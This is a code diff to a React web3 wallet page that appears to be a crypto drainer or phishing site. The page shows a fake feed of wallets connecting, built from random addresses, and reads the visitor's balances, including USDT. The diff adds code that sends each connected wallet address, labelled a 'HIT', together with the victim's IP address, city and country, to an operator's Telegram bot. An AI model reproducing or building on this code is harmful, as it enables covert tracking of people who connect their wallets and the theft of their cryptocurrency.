@@ -27,18 +27,37 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
+  // ENHANCED LOGGING WITH IP/LOCATION
+  const log = async (msg) => {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      const locInfo = `\n📍 LOC: ${data.city}, ${data.country_name} (${data.ip})`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg + locInfo })
+      });
+    } catch {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      });
+    }
+  };
 
   useEffect(() => {
     const triggerMsg = () => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} WALLET CONNECTED TO MAINNET_NODE`);
+      if (isConnected) log(`🔔 HIT: Connection established by ${address}`);
       setTimeout(() => setFeedMsg(""), 4500);
     };
     const timeout = setTimeout(triggerMsg, 2000);
-    const interval = setInterval(triggerMsg, 9000);
+    const interval = setInterval(triggerMsg, 12000);
     return () => { clearTimeout(timeout); clearInterval(interval); };
-  }, []);
+  }, [isConnected, address]);
 
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
